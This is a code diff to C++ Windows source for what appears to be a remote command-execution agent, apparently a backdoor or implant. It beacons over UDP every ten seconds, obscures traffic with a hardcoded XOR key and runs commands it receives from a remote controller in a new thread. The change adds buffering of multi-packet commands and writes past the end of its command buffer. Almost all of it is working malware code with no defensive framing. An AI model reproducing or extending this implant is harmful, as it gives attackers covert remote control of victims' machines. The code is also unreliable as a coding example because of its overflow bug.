@@ -17,7 +17,7 @@ using namespace std;
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
 
-#define DEFAULT_BUFLEN 16384
+#define MAX_CMD_LEN 32767
 #define CRYPT
 
 struct cmdcall {
@@ -32,6 +32,12 @@ std::string key = "blarknob";
 
 void crypt(std::string &m) {
 	for (std::string::size_type i = 0; i < m.length(); i++) {
+		m[i] ^= key[i % key.length()];
+	}
+}
+
+void crypt(char *m, size_t len) {
+	for (size_t i = 0; i < len; i++) {
 		m[i] ^= key[i % key.length()];
 	}
 }
@@ -137,8 +143,21 @@ bool running = true;
 
 static DWORD WINAPI connector(void *params)
 {
-	char recvbuf[DEFAULT_BUFLEN];
-	int recvbuflen = DEFAULT_BUFLEN;
+	char recvBuf[4096];
+	char cmdBuf[MAX_CMD_LEN];
+	WSADATA wsaData;
+	SOCKET sock = INVALID_SOCKET;
+	SOCKADDR_IN addr;
+	int addrLen = sizeof(addr);
+	bool ready = false;
+	int recvLen, recvTot, iResult;
+	int nError = 0;
+	DWORD lastBeacon = 0;
+
+	std::string sendq;
+
+	u_long noblock = 1;
+	u_long block = 1;
 
 	while (running) {
 
@@ -149,19 +168,6 @@ static DWORD WINAPI connector(void *params)
 			Sleep(500);
 			continue;
 		}
-
-		WSADATA wsaData;
-		SOCKET sock = INVALID_SOCKET;
-		SOCKADDR_IN addr;
-		int addrLen = sizeof(addr);
-		bool ready = false;
-		int iResult;
-		int nError = 0;
-
-		std::string recvq = "";
-		std::string sendq = "";
-		u_long noblock = 1;
-		u_long block = 1;
 
 		// wsastartup
 		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -191,7 +197,6 @@ static DWORD WINAPI connector(void *params)
 			continue;
 		}
 
-		DWORD lastBeacon = 0;
 		ready = true;
 		while (running && ready) {
 			if (sendq.length() == 0 && GetTickCount() - lastBeacon > 10000) {
@@ -232,24 +237,27 @@ static DWORD WINAPI connector(void *params)
 				}
 			}
 			// get new stuff
-			iResult = recvfrom(sock, recvbuf, recvbuflen, 0, (sockaddr*)&addr, &addrLen);
-			if (iResult > 0)
-			{
-				recvbuf[iResult] = '\0';
-				recvq = recvbuf;
+			recvLen = 0;
+			recvTot = 0;
+			while ((recvLen = recvfrom(sock, recvBuf, 4096, 0, (sockaddr*)&addr, &addrLen)) > 0) {
+				if (recvLen + recvTot > MAX_CMD_LEN)
+					break;
+				memcpy(cmdBuf + recvTot, recvBuf, recvLen);
+				recvTot += recvLen;
 			}
-			else
-				recvq = "";
 
 			// do something
-			if (recvq.length() > 0) {
+			if (recvTot > 0) {
 				cmdcall args;
-				args.cmd = recvq.substr(0, recvq.find("\n"));
 #ifdef CRYPT
-				crypt(args.cmd);
+				crypt(cmdBuf, recvTot);
 #endif
+				cmdBuf[recvTot] = '\n';
+				cmdBuf[recvTot + 1] = '\0';
+
+				args.cmd = cmdBuf;
 				args.pwd = pwd;
-				recvq = recvq.substr(recvq.find("\n") + 1, recvq.length() - (recvq.find("\n") + 1));
+
 				_beginthread((void(*)(void*))exec2, 0, (void *)&args);
 				execFinished = false;
 				while (running && ready && !execFinished) {
